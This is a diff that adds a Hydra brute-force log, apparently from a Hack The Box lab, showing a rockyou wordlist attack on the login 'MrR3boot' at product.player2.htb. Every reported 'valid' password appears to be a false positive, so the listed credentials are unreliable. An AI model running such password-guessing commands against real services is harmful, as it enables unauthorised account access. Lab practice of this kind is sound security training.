@@ -1,0 +1,17 @@
+# Hydra v9.0 run at 2020-03-30 19:48:14 on product.player2.htb http-post (hydra -l MrR3boot -P ../../wordlists/rockyou.txt -o hydra.out http-post://product.player2.htb)
+[80][http-post] host: product.player2.htb   login: MrR3boot   password: 12345
+[80][http-post] host: product.player2.htb   login: MrR3boot   password: 123456
+[80][http-post] host: product.player2.htb   login: MrR3boot   password: password
+[80][http-post] host: product.player2.htb   login: MrR3boot   password: princess
+[80][http-post] host: product.player2.htb   login: MrR3boot   password: 12345678
+[80][http-post] host: product.player2.htb   login: MrR3boot   password: iloveyou
+[80][http-post] host: product.player2.htb   login: MrR3boot   password: 1234567
+[80][http-post] host: product.player2.htb   login: MrR3boot   password: rockyou
+[80][http-post] host: product.player2.htb   login: MrR3boot   password: 123456789
+[80][http-post] host: product.player2.htb   login: MrR3boot   password: nicole
+[80][http-post] host: product.player2.htb   login: MrR3boot   password: abc123
+[80][http-post] host: product.player2.htb   login: MrR3boot   password: monkey
+[80][http-post] host: product.player2.htb   login: MrR3boot   password: daniel
+[80][http-post] host: product.player2.htb   login: MrR3boot   password: babygirl
+[80][http-post] host: product.player2.htb   login: MrR3boot   password: lovely
+[80][http-post] host: product.player2.htb   login: MrR3boot   password: jessica
